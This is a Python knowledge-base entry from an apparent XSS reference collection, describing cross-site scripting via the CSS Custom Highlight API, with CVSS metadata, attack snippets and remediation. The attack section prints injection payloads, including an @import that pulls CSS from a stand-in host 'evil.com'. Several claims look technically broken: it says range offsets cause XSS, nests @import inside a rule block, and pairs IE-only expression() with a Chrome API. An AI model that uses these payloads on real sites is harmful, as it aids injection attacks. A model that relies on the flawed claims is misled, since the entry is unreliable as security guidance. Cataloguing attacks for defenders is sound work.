#!/usr/bin/env python3

"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Created
Telegram: https://t.me/EasyProTech

Knowledge Base: CSS Custom Highlight API XSS
"""

DETAILS = {
    "title": "Cross-Site Scripting (XSS) via CSS Custom Highlight API",
    "severity": "medium",
    "cvss_score": 6.5,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N",
    "reliability": "high",
    "cwe": ["CWE-79"],
    "owasp": ["A03:2021"],
    "tags": ["xss", "css", "highlight", "text-selection", "chrome-105"],
    "description": """
CSS Custom Highlight API (Chrome 105+) allows custom text highlighting. XSS vulnerabilities
occur when user input controls highlight ranges or highlight content without validation.

SEVERITY: MEDIUM
Can lead to CSS injection and style-based attacks. Highlight ranges can be used for CSS injection.
""",
    "attack_vector": """
CUSTOM HIGHLIGHT RANGE INJECTION:
const highlight = new Highlight();
const range = new Range();
range.setStart(element, userInput);  // XSS if offset is controlled
range.setEnd(element, userInput);
highlight.add(range);
CSS.highlights.set('custom', highlight);

CUSTOM HIGHLIGHT CSS INJECTION:
::highlight(custom) {
  ${userInput}  // XSS if userInput contains CSS with expression() or @import
}

CUSTOM HIGHLIGHT WITH EXPRESSION:
::highlight(custom) {
  background: expression(alert(1));  // IE only
}

CUSTOM HIGHLIGHT WITH @IMPORT:
::highlight(custom) {
  @import url('//evil.com/xss.css');
}

CUSTOM HIGHLIGHT NAME INJECTION:
CSS.highlights.set(userInput, highlight);  // XSS if name is controlled
""",
    "remediation": """
DEFENSE:

1. Validate highlight range offsets
2. Sanitize CSS content in highlight pseudo-elements
3. Validate highlight names
4. Block @import in user-controlled CSS
5. Implement CSP style-src

SAFE PATTERN:
function validateRangeOffset(offset, maxLength) {
  if (offset < 0 || offset > maxLength) {
    throw new RangeError('Offset out of bounds');
  }
  return offset;
}
range.setStart(element, validateRangeOffset(userInput, element.textContent.length));

CSS SANITIZATION:
import { sanitize } from 'css-sanitize';
const safeCSS = sanitize(userInput);

OWASP REFERENCES:
- CWE-79: Cross-site Scripting
- CSS Custom Highlight API Specification
""",
}
